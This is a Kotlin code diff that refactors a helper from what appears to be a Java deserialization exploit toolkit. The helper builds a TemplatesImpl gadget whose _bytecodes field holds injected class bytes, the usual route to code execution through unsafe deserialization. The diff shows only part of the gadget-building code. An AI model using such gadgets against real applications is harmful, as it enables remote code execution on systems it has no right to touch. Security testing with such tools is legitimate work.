@@ -6,26 +6,22 @@ import java.io.Serializable
 
 object Gadgets {
 
-    fun createTemplatesImpl(c: Class<*>) = createTemplatesImpl(
-        c,
+    fun createTemplatesImpl(clazz: Class<*>) = createTemplatesImpl(
+        clazz,
         clazz<TemplatesImpl>(),
         clazz<TransformerFactoryImpl>()
     )
 
     fun createTemplatesImpl(
-        c: Class<*>,
+        clazz: Class<*>,
         tplClass: Class<*>,
         transFactory: Class<*>
-    ): Any {
-        val templates = tplClass.newInstance()
-
+    ) = tplClass.newInstance().apply {
         // inject class bytes into instance
-        templates.setFieldValue("_bytecodes", arrayOf(c.asByte(), clazz<Foo>().asByte()))
-
+        setFieldValue("_bytecodes", arrayOf(clazz.asByte(), clazz<Foo>().asByte()))
         // required to make TemplatesImpl happy
-        templates.setFieldValue("_name", "Pwnr")
-        templates.setFieldValue("_tfactory", transFactory.newInstance())
-        return templates
+        setFieldValue("_name", "Pwnr")
+        setFieldValue("_tfactory", transFactory.newInstance())
     }
 
     // required to make TemplatesImpl happy
